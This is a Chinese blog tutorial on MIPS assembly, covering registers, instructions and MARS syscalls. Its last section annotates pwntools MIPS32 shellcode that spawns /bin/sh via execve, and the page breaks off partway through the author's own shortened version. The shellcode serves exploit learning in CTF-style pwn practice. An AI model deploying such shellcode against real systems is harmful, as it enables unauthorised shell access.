@@ -1,0 +1,735 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="When there is a will, there is a way.">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      MIPS 学习 | GENIA
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+  
+    
+<script src="/js/local-search.js"></script>
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>GENIA</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/tags/" class="item-link">Tags</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+      
+        <li class="menu-item menu-item-search right-list">
+    <a role="button" class="popup-trigger">
+        <i class="fa fa-search fa-fw"></i>
+    </a>
+</li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/tags/" class="menu-link">Tags</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+    
+      <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+            <span class="search-icon">
+                <i class="fa fa-search"></i>
+            </span>
+            <div class="search-input-container">
+                <input autocomplete="off" autocapitalize="off"
+                    placeholder="Please enter your keyword(s) to search." spellcheck="false"
+                    type="search" class="search-input">
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa fa-times-circle"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+    
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>MIPS 学习</h2>
+  <p class="post-date">2023-12-08</p>
+  <div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h1 id="MIPS-学习"><a href="#MIPS-学习" class="headerlink" title="MIPS 学习"></a>MIPS 学习</h1><h2 id="MIPS-汇编"><a href="#MIPS-汇编" class="headerlink" title="MIPS 汇编"></a>MIPS 汇编</h2><p>学习工具：<a target="_blank" rel="noopener" href="https://courses.missouristate.edu/kenvollmar/mars/">MARS MIPS 模拟器</a>  （需要配置好 java 环境）</p>
+<p><a target="_blank" rel="noopener" href="https://godbolt.org/">Compiler Explorer (godbolt.org)</a></p>
+<p>先看看几个简单的例子（整理自 b 站 up 主正月点灯笼的 MIPS 科普系列教学）：</p>
+<ol>
+<li>加法</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">li $t1,1</span><br><span class="line">add $t0,$t1,2   # add 需要三个操作数，将后两个相加的结果存储在第一个寄存器中</span><br><span class="line"># printf(&quot;%d,t0)</span><br><span class="line"># $v0 = 1,syscall -&gt; print_int</span><br><span class="line">move $a0,$t0     # print 默认打印 a0 的值</span><br><span class="line">li $v0,1  	# v0 中存放系统调用号</span><br><span class="line">syscall    # print(a0)</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>hello world</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line"># char* msg = &quot;Hello World&quot;;</span><br><span class="line">msg:	.ascii &quot;Hello World\0&quot;       #自己定义数据段，msg 为字符串地址</span><br><span class="line"></span><br><span class="line">.text</span><br><span class="line"># $v0 = 4,syscall -&gt; print_string</span><br><span class="line">la $a0,msg</span><br><span class="line">li $v0,4</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>if 分支</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">  msg_yes:		.ascii  &quot;Yes!&quot;</span><br><span class="line">  msg_no:		.ascii  &quot;No!&quot;</span><br><span class="line"></span><br><span class="line">.text</span><br><span class="line"># scanf ( &quot; %d &quot;, &amp;a);  $t0: a    scanf 得到的值默认存放在 v0 寄存器中</span><br><span class="line">li $v0,5</span><br><span class="line">syscall        # a-&gt;v0-&gt;t0</span><br><span class="line">move $t0,$v0</span><br><span class="line"># scanf ( &quot; %d &quot;, &amp;b);  $t1: b</span><br><span class="line">li $v0,5</span><br><span class="line">syscall        # b-&gt;v0-&gt;t1</span><br><span class="line">move $t1,$v0</span><br><span class="line"></span><br><span class="line"># if ( a &gt; b )&#123;</span><br><span class="line">#	printf ( &quot; YES\0 &quot; );</span><br><span class="line"># &#125;</span><br><span class="line"># else&#123;</span><br><span class="line">#	printf ( &quot; NO\0 &quot; );</span><br><span class="line"># &#125;</span><br><span class="line"></span><br><span class="line"># if t0 &gt; t1 -&gt; sub1    sub1 类似于x86/x64 中的标签</span><br><span class="line">bgt $t0, $t1, sub1</span><br><span class="line"># 相当于 else 的内容：</span><br><span class="line">la $a0, msg_no</span><br><span class="line">li $v0, 4</span><br><span class="line">syscall</span><br><span class="line"># exit                  如果这边不退出则会默认继续执行，输出 yes</span><br><span class="line">li $v0, 10</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">sub1:</span><br><span class="line">la $a0, msg_yes</span><br><span class="line">li $v0, 4</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>循环</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># 1 + 2 + 3 + .. + 100</span><br><span class="line"># i = 1;    $t0 -&gt; i</span><br><span class="line">li $t0, 1</span><br><span class="line"># s = 0;    $t1 -&gt; i</span><br><span class="line">li $t1, 0</span><br><span class="line"></span><br><span class="line"># while( i &lt;= 100 )&#123;</span><br><span class="line">#	s = s + i;</span><br><span class="line">#	i = i + 1;</span><br><span class="line"># &#125;</span><br><span class="line"></span><br><span class="line">loop:</span><br><span class="line">add $t1,$t1,$t0</span><br><span class="line">add $t0,$t0,1</span><br><span class="line"></span><br><span class="line"># if t0 &lt; 100 -&gt; loop</span><br><span class="line">ble $t0, 100, loop</span><br><span class="line"></span><br><span class="line"># print((int)a0)</span><br><span class="line">move $a0, $t1</span><br><span class="line">li $v0, 1</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+
+<p>其实基本上和 x86&#x2F;x64 是一样的。</p>
+<h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><p>仅介绍用户态可以使用的寄存器。</p>
+<h4 id="32-个通用寄存器"><a href="#32-个通用寄存器" class="headerlink" title="32 个通用寄存器"></a>32 个通用寄存器</h4><table>
+<thead>
+<tr>
+<th align="left">寄存器编号</th>
+<th align="left">别名</th>
+<th align="left">用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">$0</td>
+<td align="left">$zero</td>
+<td align="left">常量0(constant value 0)</td>
+</tr>
+<tr>
+<td align="left">$1</td>
+<td align="left">$at</td>
+<td align="left">保留给汇编器(Reserved for assembler)</td>
+</tr>
+<tr>
+<td align="left">$2-$3</td>
+<td align="left">$v0-$v1</td>
+<td align="left">函数调用返回值(values for results and expression evaluation)</td>
+</tr>
+<tr>
+<td align="left">$4-$7</td>
+<td align="left">$a0-$a3</td>
+<td align="left">函数调用参数(arguments)</td>
+</tr>
+<tr>
+<td align="left">$8-$15</td>
+<td align="left">$t0-$t7</td>
+<td align="left">暂时的(或随便用的)</td>
+</tr>
+<tr>
+<td align="left">$16-$23</td>
+<td align="left">$s0-$s7</td>
+<td align="left">保存的(或如果用，需要SAVE&#x2F;RESTORE的)(saved)</td>
+</tr>
+<tr>
+<td align="left">$24-$25</td>
+<td align="left">$t8-$t9</td>
+<td align="left">暂时的(或随便用的)</td>
+</tr>
+<tr>
+<td align="left">$28</td>
+<td align="left">$gp</td>
+<td align="left">全局指针(Global Pointer)</td>
+</tr>
+<tr>
+<td align="left">$29</td>
+<td align="left">$sp</td>
+<td align="left">堆栈指针(Stack Pointer)</td>
+</tr>
+<tr>
+<td align="left">$30</td>
+<td align="left">$fp</td>
+<td align="left">帧指针(Frame Pointer)</td>
+</tr>
+<tr>
+<td align="left">$31</td>
+<td align="left">$ra</td>
+<td align="left">返回地址(return address)</td>
+</tr>
+</tbody></table>
+<h4 id="两个整数乘法寄存器"><a href="#两个整数乘法寄存器" class="headerlink" title="两个整数乘法寄存器"></a>两个整数乘法寄存器</h4><p>HI 和 LO 寄存器。</p>
+<p>在64位处理器上，对于两个32位做乘法运算后，可以产生64位结果。可以临时将结果的低32位放在 LO 寄存器，高32位放在 HI 寄存器。例如下面的指令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mult $t0,$t1   # t0和t1的乘法操作，结果的低32位存放在寄存器LO，结果的高32位存放在寄存器HI</span><br><span class="line">mflo $a4   # 拷贝LO的值到通用寄存器a4</span><br><span class="line">mfhi $a5   # 拷贝HI的值到通用寄存器a5</span><br></pre></td></tr></table></figure>
+
+<p>HI和LO是特殊的寄存器，不允许程序直接使用，里面的结果要通过指令mflo和mfhi获取。<br>HI和LO寄存器也用于除法运算结果的临时保存。除法运算结果商临时存放在寄存器LO，余数存放在寄存器HI。实例如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">div $t0,$t1    #t0和t1的除法运算，运算结果的商存放在寄存器LO，余数存放在寄存器HI</span><br><span class="line">mflo $a4   #LO = t0/t1</span><br><span class="line">mfhi $a5   #HI = t0%t1</span><br></pre></td></tr></table></figure>
+
+<p>和 8086 中的 ax 和 dx 的作用极为相似。</p>
+<h4 id="32-个浮点寄存器"><a href="#32-个浮点寄存器" class="headerlink" title="32 个浮点寄存器"></a>32 个浮点寄存器</h4><table>
+<thead>
+<tr>
+<th>浮点寄存器编号</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>$f0,$f2</td>
+<td>用作函数返回值</td>
+</tr>
+<tr>
+<td>$f12−$f19</td>
+<td>用作传递参数</td>
+</tr>
+<tr>
+<td>$f24−$f31</td>
+<td>寄存器变量，发生函数调用时要保存</td>
+</tr>
+<tr>
+<td>$f1、$f3−$f11 、$f20−$f23</td>
+<td>用作临时变量</td>
+</tr>
+</tbody></table>
+<p>功能的分配基本上和通用寄存器相同。比如一个函数返回值为整数或指针时，使用通用寄存器的v0，返回值为浮点类型时，就使用浮点寄存器 f0。函数调用时的参数是整型就用通用寄存器 a0-a7 传递，如果是浮点类型就用 f12−f19 传递。对于函数返回地址、栈指针等还是使用通用寄存器的ra、sp。</p>
+<h4 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h4><p><strong>addiu</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addiu $dst, $src, immediate  </span><br></pre></td></tr></table></figure>
+
+<p>无符号立即数相加，这条指令在执行时不会引发整数溢出异常。</p>
+<ul>
+<li><code>$dst</code> 是目标寄存器，存储相加的结果。</li>
+<li><code>$src</code> 是源寄存器，其当前值将与立即数相加。</li>
+<li><code>immediate</code> 是一个无符号的16位立即数，用于相加。</li>
+</ul>
+<p><strong>addi</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addi $dst, $src, immediate</span><br></pre></td></tr></table></figure>
+
+<p>用于将一个寄存器的值与一个16位的有符号的立即数相加，并将结果存储回该寄存器。</p>
+<p><strong>sw</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sw $source, offset($base)</span><br></pre></td></tr></table></figure>
+
+<p>一个存储字（Store Word）的指令。用于将一个32位的字（通常是一个整数）存储到内存中的指定位置。</p>
+<ul>
+<li><code>$source</code> 是要存储的寄存器，其中包含要存储的32位数据。</li>
+<li><code>offset</code> 是一个16位的立即数偏移量，用于计算存储地址。</li>
+<li><code>$base</code> 是基址寄存器，包含存储目标的基本内存地址。</li>
+</ul>
+<p>指令的执行过程是将 <code>$source</code> 寄存器中的值存储到内存地址 <code>$base + offset</code> 处。通常用于将数据写入数组或其他数据结构中的特定位置。</p>
+<p><strong>move（伪指令）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">move $t1, $t0 </span><br><span class="line"># 相当于</span><br><span class="line">addu $t1, $zero, $t0</span><br></pre></td></tr></table></figure>
+
+<p>将一个寄存器的值移动到另一个寄存器，类似于赋值操作。</p>
+<p><strong>li（伪指令）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">li $dst, immediate</span><br><span class="line"># 比如</span><br><span class="line">li $t0, 42</span><br><span class="line"># 相当于</span><br><span class="line">lui $t0, 0x0       # 将 0x0（立即数的高16位）加载到 $t0</span><br><span class="line">ori $t0, $t0, 42   # 将 42（立即数的低16位）与 $t0 进行按位或操作</span><br></pre></td></tr></table></figure>
+
+<p>用于将一个立即数加载到一个寄存器中。</p>
+<ul>
+<li><code>$dst</code> 是目标寄存器，用于存储加载的立即数。</li>
+<li><code>immediate</code> 是一个立即数。</li>
+</ul>
+<p><strong>la（伪指令）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">la $dst, label</span><br><span class="line"># 比如</span><br><span class="line">la $t0, my_data</span><br><span class="line"># 相当于</span><br><span class="line">lui $t0, %hi(my_data)   # 加载高16位地址部分</span><br><span class="line">ori $t0, $t0, %lo(my_data)  # 加载低16位地址部分</span><br></pre></td></tr></table></figure>
+
+<p>将一个数据标签（通常是全局变量或标签）的地址加载到一个寄存器中。</p>
+<ul>
+<li><code>$dst</code> 是目标寄存器，用于存储加载的地址。</li>
+<li><code>label</code> 是数据标签的名称。</li>
+</ul>
+<p><strong>lw</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lw $dst, offset($base)</span><br></pre></td></tr></table></figure>
+
+<p>从内存中加载一个32位字（word）到寄存器中。</p>
+<ul>
+<li><code>$dst</code> 是目标寄存器，用于存储加载的32位字。</li>
+<li><code>offset</code> 是一个16位的立即数偏移量，用于计算内存地址。</li>
+<li><code>$base</code> 是基址寄存器，包含计算出的内存地址的基本值。</li>
+</ul>
+<p>指令的执行过程是从内存中地址 <code>$base + offset</code> 处读取一个32位字，并将其存储到目标寄存器 <code>$dst</code> 中。</p>
+<p><strong>jalr</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jalr $dst, $src</span><br></pre></td></tr></table></figure>
+
+<p>用于实现子程序调用和保存返回地址。</p>
+<ul>
+<li><code>$dst</code> 是目标寄存器，用于存储返回地址。</li>
+<li><code>$src</code> 是源寄存器，包含子程序的地址。</li>
+</ul>
+<p><code>jalr</code> 指令会将当前指令的地址（即返回地址）存储到 <code>$dst</code> 寄存器中，并跳转到 <code>$src</code> 寄存器中存储的地址。</p>
+<p><strong>jr</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jr $src</span><br></pre></td></tr></table></figure>
+
+<p>无条件跳转到一个寄存器中存储的地址。</p>
+<p><strong>jal</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jal target_address</span><br></pre></td></tr></table></figure>
+
+<p>用于进行无条件跳转，并将返回地址保存到 <code>$ra</code> 寄存器中，以便在后续的程序中进行子程序调用的返回。</p>
+<p><strong>ori</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ori $dst, $src, immediate</span><br></pre></td></tr></table></figure>
+
+<p>用于将一个寄存器的值与一个立即数进行按位或操作，并将结果存储回该寄存器。</p>
+<ul>
+<li><code>$dst</code> 是目标寄存器，用于存储按位或操作的结果。</li>
+<li><code>$src</code> 是源寄存器，其当前值将与立即数进行按位或操作。</li>
+<li><code>immediate</code> 是一个16位的立即数，用于按位或操作。</li>
+</ul>
+<p><strong>slti</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slti $dst, $src, immediate</span><br></pre></td></tr></table></figure>
+
+<p>将一个寄存器的值与一个立即数进行有符号比较，如果寄存器的值小于立即数，则将目标寄存器的值设置为 1，否则设置为 0。</p>
+<h3 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h3><p>在 MARS MIPS 模拟器中编程可使用的：</p>
+<table>
+<thead>
+<tr>
+<th align="center">功能</th>
+<th>调用号$v0</th>
+<th align="left">参数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">print integer</td>
+<td>1</td>
+<td align="left">$a0 &#x3D; integer to print</td>
+</tr>
+<tr>
+<td align="center">print float</td>
+<td>2</td>
+<td align="left">$f12 &#x3D; float to print</td>
+</tr>
+<tr>
+<td align="center">print double</td>
+<td>3</td>
+<td align="left">$f12 &#x3D; double to print</td>
+</tr>
+<tr>
+<td align="center">print string</td>
+<td>4</td>
+<td align="left">$a0 &#x3D; address of null-terminated string to print</td>
+</tr>
+<tr>
+<td align="center">read integer</td>
+<td>5</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="center">read float</td>
+<td>6</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="center">read double</td>
+<td>7</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="center">read string</td>
+<td>8</td>
+<td align="left">$a0 &#x3D; 输入缓冲区的地址                                                                                                                                        $a1 &#x3D; 读取的最大字符数</td>
+</tr>
+<tr>
+<td align="center">sbrk (allocate heap memory)</td>
+<td>9</td>
+<td align="left">$a0 &#x3D; number of bytes to allocate</td>
+</tr>
+<tr>
+<td align="center">exit (terminate execution)</td>
+<td>10</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="center">print character</td>
+<td>11</td>
+<td align="left">$a0 &#x3D; character to print</td>
+</tr>
+<tr>
+<td align="center">read character</td>
+<td>12</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="center">open file</td>
+<td>13</td>
+<td align="left">$a0 &#x3D; address of null-terminated string containing filename                                                                              $a1 &#x3D; flags                                                                                                                                                               $a2 &#x3D; mode</td>
+</tr>
+<tr>
+<td align="center">read from file</td>
+<td>14</td>
+<td align="left">$a0 &#x3D; file descriptor                                                                                                                                               $a1 &#x3D; address of input buffer                                                                                                                                                $a2 &#x3D; maximum number of characters to read</td>
+</tr>
+<tr>
+<td align="center">write to file</td>
+<td>15</td>
+<td align="left">$a0 &#x3D; file descriptor                                                                                                                                              $a1 &#x3D; address of output buffer                                                                                                                                $a2 &#x3D; number of characters to write</td>
+</tr>
+<tr>
+<td align="center">close file</td>
+<td>16</td>
+<td align="left">$a0 &#x3D; file descriptor</td>
+</tr>
+<tr>
+<td align="center">sleep</td>
+<td>32</td>
+<td align="left">$a0 &#x3D; the length of time to sleep in milliseconds.</td>
+</tr>
+<tr>
+<td align="center">print integer in hexadecimal</td>
+<td>34</td>
+<td align="left">$a0 &#x3D; integer to print</td>
+</tr>
+<tr>
+<td align="center">print integer in binary</td>
+<td>35</td>
+<td align="left">$a0 &#x3D; integer to print</td>
+</tr>
+<tr>
+<td align="center">print integer as unsigned</td>
+<td>36</td>
+<td align="left">$a0 &#x3D; integer to print</td>
+</tr>
+</tbody></table>
+<p>真实环境下系统调用号以及调用方式参考：</p>
+<p>[源码中规定的系统调用号][<a target="_blank" rel="noopener" href="https://github.com/spotify/linux/blob/master/arch/mips/include/asm/unistd.h]">https://github.com/spotify/linux/blob/master/arch/mips/include/asm/unistd.h]</a></p>
+<p>[调用方式][<a target="_blank" rel="noopener" href="https://www.linux-mips.org/wiki/Syscall]">https://www.linux-mips.org/wiki/Syscall]</a></p>
+<p><a target="_blank" rel="noopener" href="https://syscalls.w3challs.com/?arch=mips_o32">https://syscalls.w3challs.com/?arch=mips_o32</a></p>
+<h2 id="shellcode-编写"><a href="#shellcode-编写" class="headerlink" title="shellcode 编写"></a>shellcode 编写</h2><p>参考：<a target="_blank" rel="noopener" href="https://fireshellsecurity.team/writing-a-shellcode-for-mips32/">https://fireshellsecurity.team/writing-a-shellcode-for-mips32/</a></p>
+<p>做了一些 mips pwn，主要还是以 32 位小端为主。</p>
+<p>先利用 pwntools 生成的 shellcode 作为参考：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">/* execve(path=&#x27;//bin/sh&#x27;, argv=[&#x27;sh&#x27;], envp=&#123;&#125;) */</span><br><span class="line">/* push b&#x27;//bin/sh\x00&#x27; */</span><br><span class="line">li $t1, 0x69622f2f</span><br><span class="line">sw $t1, -12($sp)</span><br><span class="line">li $t1, 0x68732f6e</span><br><span class="line">sw $t1, -8($sp)    # 将 /bin/sh 存放在栈上</span><br><span class="line">sw $zero, -4($sp)</span><br><span class="line">addiu $sp, $sp, -12</span><br><span class="line">add $a0, $sp, $0 # 将 /bin/sh 的地址传给 a0</span><br><span class="line">/* push argument array [&#x27;sh\x00&#x27;] */</span><br><span class="line">/* push b&#x27;sh\x00\x00&#x27; */</span><br><span class="line">ori $t1, $zero, 26739   # 把小端的 &#x27;sh&#x27; 存放在 t1 中</span><br><span class="line">sw $t1, -4($sp)   # 放到栈上</span><br><span class="line">addiu $sp, $sp, -4 </span><br><span class="line">slti $a1, $zero, 0xFFFF /* $a1 = 0 */  # 这句的意义是什么，直接赋值0不就好了</span><br><span class="line">sw $a1, -4($sp)</span><br><span class="line">addi $sp, $sp, -4 /* null terminate */</span><br><span class="line">li $t9, ~4   # 将对 4 进行按位取反后的值存放在 $t9 里</span><br><span class="line">not $a1, $t9  # $a1 = 4，所以上一句是在干什么</span><br><span class="line">add $a1, $sp, $a1</span><br><span class="line">sw $a1, -4($sp)</span><br><span class="line">addi $sp, $sp, -4 /* &#x27;sh\x00&#x27; */</span><br><span class="line">add $a1, $sp, $0 /* mov $a1, $sp */   #将 &#x27;sh&#x27; 的地址传给 a1</span><br><span class="line">/* push argument array [] */</span><br><span class="line">/* push b&#x27;\x00&#x27; */</span><br><span class="line">sw $zero, -4($sp)</span><br><span class="line">addiu $sp, $sp, -4</span><br><span class="line">slti $a2, $zero, 0xFFFF /* $a2 = 0 */</span><br><span class="line">sw $a2, -4($sp)</span><br><span class="line">addi $sp, $sp, -4 /* null terminate */</span><br><span class="line">add $a2, $sp, $0 /* mov $a2, $sp */</span><br><span class="line">/* setregs noop */</span><br><span class="line">/* call execve() */</span><br><span class="line">ori $v0, $zero, (4000 + 11)  # 设置系统调用号</span><br><span class="line">syscall 0x40404</span><br></pre></td></tr></table></figure>
+
+<p>来做一些修改，首先把 shellcode 的长度尽可能缩减，其次，为了增加 shellcode 的兼容性，尽可能不使用伪指令。</p>
+<p>MIPS 的 shellcode 和 x86&#x2F;x64 本质上是一样的，首先需要构造 &#x2F;bin&#x2F;sh\x00 字符串并将其地址传给相应寄存器，接着设置系统调用号，执行 execve 系统调用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># $a0 存放 /bin/sh 的地址</span><br><span class="line"># 设置 $a1 为 null，表示无命令行参数</span><br><span class="line"># 设置 $a2 为 null，表示无环境变量</span><br></pre></td></tr></table></figure>
+
+<p>1.解决 &#x2F;bin&#x2F;sh\x00 的问题</p>
+<p>MIPS 的通用寄存器都是 32 位的，一次只能存储 &#x2F;bin&#x2F;sh\x00 的一半。</p>
+<p>因此将 &#x2F;bin&#x2F;sh\x00 分为两半存放在两个临时寄存器中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lui $t7, 0x2f2f</span><br><span class="line">ori $t7, $t7, 0x6269  # //bi</span><br><span class="line">lui $t6, 0x6e2f</span><br><span class="line">ori $t6, $t6, 0x7368  # n/sh</span><br></pre></td></tr></table></figure>
+
